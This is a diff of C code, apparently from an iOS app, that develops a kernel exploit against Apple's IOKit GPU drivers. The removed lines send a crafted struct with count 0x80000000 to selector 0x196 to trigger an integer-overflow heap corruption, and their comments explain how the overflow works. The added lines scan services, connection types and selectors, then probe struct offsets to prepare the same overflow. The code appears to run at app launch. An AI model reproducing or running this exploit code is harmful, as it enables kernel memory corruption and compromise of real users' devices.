@@ -229,120 +229,139 @@ extern kern_return_t IOConnectCallMethod(io_connect_t conn, uint32_t sel,
     const uint64_t *in, uint32_t inCnt, const void *inStruct, size_t inSz,
     uint64_t *out, uint32_t *outCnt, void *outStruct, size_t *outSz);
 
-#define GPU_SELECTOR_ADD_RESOURCES  0x196
-#define GPU_SELECTOR_CREATE_SET     0x195
-
 static void trigger_bof_iokit(void) {
-    evf("STARTING direct IOUserClient BOF path");
+    evf("IOKIT PROBE: full scan start");
 
-    /* Probe multiple GPU service names and connection types */
-    const char *service_names[] = {
-        "IOGPU", "IOGPUDevice", "AGXG18P", "AGXG18X",
-        "AGXSolo", "IOGPUFamily", NULL
+    const char *svc_names[] = {
+        "IOGPU", "IOGPUDevice", "AGXG18P", "AGXG18X", "AGXSolo", "IOGPUFamily", NULL
     };
-    const uint32_t conn_types[] = { 0, 1, 2, 3, 0x100, 0x101 };
+    const uint32_t ctypes[] = { 0, 1, 2, 3, 0x100, 0x101 };
+    const int N_CTYPES = 6;
+
+    typedef struct { const char *svc; uint32_t ctype; io_connect_t conn; } CEntry;
+    CEntry conns[36];
+    int nc = 0;
 
     mach_port_t master = 0;
     IOMasterPort(MACH_PORT_NULL, &master);
 
-    io_connect_t conn = 0;
-    kern_return_t open_kr = 0;
-
-    for (int si = 0; service_names[si] && !conn; si++) {
-        CFMutableDictionaryRef match = IOServiceMatching(service_names[si]);
+    for (int si = 0; svc_names[si]; si++) {
+        CFMutableDictionaryRef match = IOServiceMatching(svc_names[si]);
         io_iterator_t it = 0;
         IOServiceGetMatchingServices(master, match, &it);
         io_service_t svc = IOIteratorNext(it);
         IOObjectRelease(it);
-        if (!svc) {
-            evf("service '%s': not found", service_names[si]);
-            continue;
-        }
-        evf("service '%s': found port=0x%x", service_names[si], svc);
-        for (int ti = 0; ti < 6 && !conn; ti++) {
+        if (!svc) continue;
+
+        for (int ti = 0; ti < N_CTYPES; ti++) {
             io_connect_t c = 0;
-            open_kr = IOServiceOpen(svc, mach_task_self(), conn_types[ti], &c);
-            if (open_kr == KERN_SUCCESS) {
-                evf("IOServiceOpen '%s' type=%u: OK conn=0x%x",
-                    service_names[si], conn_types[ti], c);
-                conn = c;
-            } else {
-                evf("IOServiceOpen '%s' type=%u: 0x%x",
-                    service_names[si], conn_types[ti], open_kr);
+            kern_return_t kr = IOServiceOpen(svc, mach_task_self(), ctypes[ti], &c);
+            if (kr == 0) {
+                evf("OPEN %s t=%u conn=0x%x", svc_names[si], ctypes[ti], c);
+                conns[nc++] = (CEntry){svc_names[si], ctypes[ti], c};
             }
         }
         IOObjectRelease(svc);
     }
+    evf("OPEN_DONE: %d connections", nc);
 
-    if (!conn) {
-        evf("all service/type probes failed: kr=0x%x", open_kr);
-        return;
+    /* Selector scan: report anything != kIOReturnUnsupported (0xe00002c7) */
+    for (int ci = 0; ci < nc; ci++) {
+        io_connect_t conn = conns[ci].conn;
+        uint8_t st_in[128] = {0};
+        uint64_t sc_out[4] = {0};
+        uint32_t sc_cnt = 4;
+        uint8_t st_out[64] = {0};
+        size_t st_out_sz = sizeof(st_out);
+
+        for (uint32_t sel = 0x170; sel <= 0x1C0; sel++) {
+            sc_cnt = 4; st_out_sz = sizeof(st_out);
+            kern_return_t kr = IOConnectCallMethod(conn, sel,
+                NULL, 0, st_in, sizeof(st_in),
+                sc_out, &sc_cnt, st_out, &st_out_sz);
+            if (kr != 0xe00002c7) {
+                evf("HIT %s t=%u sel=0x%x kr=0x%x",
+                    conns[ci].svc, conns[ci].ctype, sel, kr);
+                /* For HIT selectors, also try with scalars */
+                for (int ns = 1; ns <= 2; ns++) {
+                    uint64_t sc_in[2] = {0};
+                    sc_cnt = 4; st_out_sz = sizeof(st_out);
+                    kr = IOConnectCallMethod(conn, sel,
+                        sc_in, ns, st_in, sizeof(st_in),
+                        sc_out, &sc_cnt, st_out, &st_out_sz);
+                    evf("HIT %s t=%u sel=0x%x ns=%d kr=0x%x",
+                        conns[ci].svc, conns[ci].ctype, sel, ns, kr);
+                }
+            }
+        }
     }
+    evf("SCAN_DONE");
 
-    evf("IOGPUFamily connection opened: 0x%x", conn);
+    /* Now try the BOF: for every connection that answered sel 0x196, */
+    /* craft struct with count=4 at offset 0x10 (test) then 0x80000000 */
+    /* Also try CREATE first (0x195) to get a valid set handle */
+    for (int ci = 0; ci < nc; ci++) {
+        io_connect_t conn = conns[ci].conn;
+        uint64_t sc_in[4]  = {0};
+        uint64_t sc_out[4] = {0};
+        uint32_t sc_cnt    = 4;
 
-    /* Craft argument struct for s_group_add_resources:
-     * arg struct has count at offset 0x20 (4 bytes).
-     * Trigger: count = INT32_MIN = 0x80000000
-     * -> smull(INT32_MIN, 24) = -0x1000000000 (very_negative)
-     * -> kalloc(-0x1000000000 + 8) -> returns near-NULL or tiny allocation
-     * -> subsequent writes corrupt heap */
+        /* Attempt CREATE (0x195) to get handle */
+        uint8_t  cr_in[64] = {0};
+        uint8_t  cr_out[64] = {0};
+        size_t   cr_out_sz = sizeof(cr_out);
+        sc_cnt = 4;
+        kern_return_t kr_cr = IOConnectCallMethod(conn, 0x195,
+            sc_in, 2, cr_in, sizeof(cr_in),
+            sc_out, &sc_cnt, cr_out, &cr_out_sz);
+        if (kr_cr == 0) {
+            evf("CREATE_OK %s t=%u sc_out[0]=0x%llx sc_out[1]=0x%llx cr_out_sz=%zu",
+                conns[ci].svc, conns[ci].ctype, sc_out[0], sc_out[1], cr_out_sz);
 
-    typedef struct {
-        uint64_t field_0;
-        uint64_t field_8;
-        uint64_t field_10;
-        uint64_t field_18;
-        /* +0x20: pointer to count struct */
-        uint64_t count_struct_ptr;
-        uint64_t field_28;
-        uint64_t field_30;
-        uint64_t field_38;
-        uint64_t field_40;  /* resource_set selector */
-    } gpu_add_args_t;
+            /* Use handle in ADD (0x196) with small count=4 to check struct format */
+            uint8_t add_in[128] = {0};
+            *(uint64_t*)(add_in + 0x00) = sc_out[0];  /* handle at 0x00 */
+            *(uint32_t*)(add_in + 0x10) = 4;           /* count at 0x10 */
+            uint8_t  add_out[64] = {0};
+            size_t   add_out_sz = sizeof(add_out);
+            sc_cnt = 4;
+            kern_return_t kr_add = IOConnectCallMethod(conn, 0x196,
+                sc_in, 0, add_in, sizeof(add_in),
+                sc_out, &sc_cnt, add_out, &add_out_sz);
+            evf("ADD_0x10 %s t=%u handle=0x%llx kr=0x%x",
+                conns[ci].svc, conns[ci].ctype, sc_out[0], kr_add);
 
-    typedef struct {
-        uint32_t count;     /* INT32_MIN = overflow trigger */
-        uint32_t other;
-        uint64_t padding[2];
-    } gpu_count_struct_t;
+            /* Try count at other offsets */
+            const int offsets[] = {0x00, 0x08, 0x18, 0x20, 0x28};
+            for (int oi = 0; oi < 5; oi++) {
+                memset(add_in, 0, sizeof(add_in));
+                *(uint64_t*)(add_in + 0x00) = sc_out[0];
+                *(uint32_t*)(add_in + offsets[oi]) = 4;
+                sc_cnt = 4; add_out_sz = sizeof(add_out);
+                kr_add = IOConnectCallMethod(conn, 0x196,
+                    sc_in, 0, add_in, sizeof(add_in),
+                    sc_out, &sc_cnt, add_out, &add_out_sz);
+                if (kr_add != 0xe00002c7)
+                    evf("ADD_off=0x%x %s t=%u kr=0x%x",
+                        offsets[oi], conns[ci].svc, conns[ci].ctype, kr_add);
+            }
 
-    gpu_count_struct_t cs = {
-        .count = 0x80000000,  /* INT32_MIN = trigger overflow */
-        .other = 0,
-    };
+            /* Also try passing handle as scalar[0] */
+            sc_in[0] = sc_out[0];
+            memset(add_in, 0, sizeof(add_in));
+            *(uint32_t*)(add_in + 0x10) = 4;
+            sc_cnt = 4; add_out_sz = sizeof(add_out);
+            kr_add = IOConnectCallMethod(conn, 0x196,
+                sc_in, 1, add_in, sizeof(add_in),
+                sc_out, &sc_cnt, add_out, &add_out_sz);
+            evf("ADD_scalar_hdl %s t=%u kr=0x%x", conns[ci].svc, conns[ci].ctype, kr_add);
+        } else {
+            evf("CREATE_FAIL %s t=%u kr=0x%x", conns[ci].svc, conns[ci].ctype, kr_cr);
+        }
 
-    gpu_add_args_t args = {0};
-    args.count_struct_ptr = (uint64_t)&cs;
-
-    uint64_t scalar_in[1]  = {0};
-    uint64_t scalar_out[1] = {0};
-    uint32_t scalar_cnt_out = 1;
-
-    uint8_t struct_out[512] = {0};
-    size_t  struct_out_sz = sizeof(struct_out);
-
-    evf("Sending selector 0x%x with count=0x%x (INT32_MIN)",
-        GPU_SELECTOR_ADD_RESOURCES, cs.count);
-
-    kern_return_t kr = IOConnectCallMethod(conn,
-                             GPU_SELECTOR_ADD_RESOURCES,
-                             scalar_in, 0,
-                             &args, sizeof(args),
-                             scalar_out, &scalar_cnt_out,
-                             struct_out, &struct_out_sz);
-
-    evf("IOConnectCallMethod returned: 0x%x", kr);
-
-    if (kr == KERN_SUCCESS) {
-        evf("BOF TRIGGERED: selector accepted count=0x80000000!");
-    } else if (kr == 0xe00002c2) {
-        evf("PATCHED: kernel rejected overflow count (0xe00002c2 = kIOReturnBadArgument)");
-    } else {
-        evf("returned kr=0x%x (invalid selector or struct format)", kr);
+        IOServiceClose(conn);
     }
-
-    IOServiceClose(conn);
+    evf("IOKIT PROBE COMPLETE");
 }
 
 /* App entry point — called from application:didFinishLaunchingWithOptions: */
